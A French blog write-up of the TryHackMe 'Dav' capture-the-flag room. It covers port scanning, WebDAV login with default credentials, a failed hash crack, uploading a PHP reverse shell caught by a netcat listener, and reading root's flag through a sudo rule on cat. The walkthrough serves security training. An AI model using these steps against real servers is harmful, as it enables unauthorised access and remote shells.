---
title: "Write-up | Dav"
date: 2020-07-08T22:35:00+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Ce write-up sera dédié à la room Dav, sur [Try Hack Me](https://tryhackme.com).

## Reconnaissance

Je commence par un scan de ports avec `nmap` :
```
$ nmap -T4 -A 10.10.239.64 -oN scans/ports.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 19:04 CEST
Nmap scan report for 10.10.239.64
Host is up (0.065s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
Il semblerait n'y avoir qu'un serveur Apache sur le port 80. Je passe à l'énumération avec `gobuster` :
```
/webdav
```
En cherchant sur Internet, je tombe sur [ce site](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) qui indique que les creds par défaut sont `wampp:xampp`. Nous sommes chanceux, ils n'ont pas été changés :)
Une fois sur la page, il y a un fichier nommé `passwd.dav` qui contient `wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91`.
`hash-identifier` indique que ce hash correspond à du MD5(APR).

Sur [hashcat.net](https://hashcat.net/wiki/doku.php?id=example_hashes), je trouve que le mode correspondant pour `hashcat` est 1600.
```
$ hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
...
Session..........: hashcat                       
Status...........: Exhausted
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
Time.Started.....: Wed Jul  8 19:28:37 2020 (11 mins, 36 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    20401 H/s (12.29ms) @ Accel:64 Loops:500 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
```
Tout `rockyou.txt` sera passé sur ce hash, et rien. J'ai remis une couche avec `john` et toujours rien.

J'utilise alors `searchploit` pour voir si il y a des vulnérabilité connues de ce service :
```
$ searchsploit webdav
...
XAMPP - WebDAV PHP Upload (Metasploit) | windows/remote/18367.rb
```
C'est plutôt bon signe :)

## Exploitation

J'utilise l'_exploit_ `windows/http/xampp_webdav_upload_php` sur `metasploit`. Après l'avoir exécuté, j'ai bien les 2 fichiers PHP qui sont sur le serveur, mais aucun reverse shell ne se créé.

Changement de plan : je récupère un reverse shell en PHP [ici](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), puis utilise `cadaver` pour l'uploader :
```
$ cadaver http://10.10.239.64/webdav/
Authentication required for webdav on server `10.10.239.64':
Username: wampp
Password: 
dav:/webdav/> put revshell.php 
Uploading revshell.php to `/webdav/revshell.php':
Progress: [=============================>] 100,0% of 3458 bytes succeeded.
```
Succès ! Je lance `nc` sur un autre terminal et j'ouvre le fichier PHP fraichement uploadé :
```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.37.193] from (UNKNOWN) [10.10.239.64] 50860
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
...
$ whoami
www-data
```
J'explore le `/home`, et je trouve l'utilisateur `merlin`, qui a le flag `user.txt` :
```
$ cat /home/merlin/user.txt
[edited]
```

## Élévation de privilèges

J'effectue le traditionnel `sudo -l`:
```
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
C'est presque trop facile :p

```
$ sudo cat /root/root.txt
[edited]
```
Et voilà, la room est terminée !

Je l'ai trouvé super sympa à faire, la difficultée est bien calibrée pour débuter les CTF. Petite dédicace au hash qui m'a fait perdre un peu de temps :D
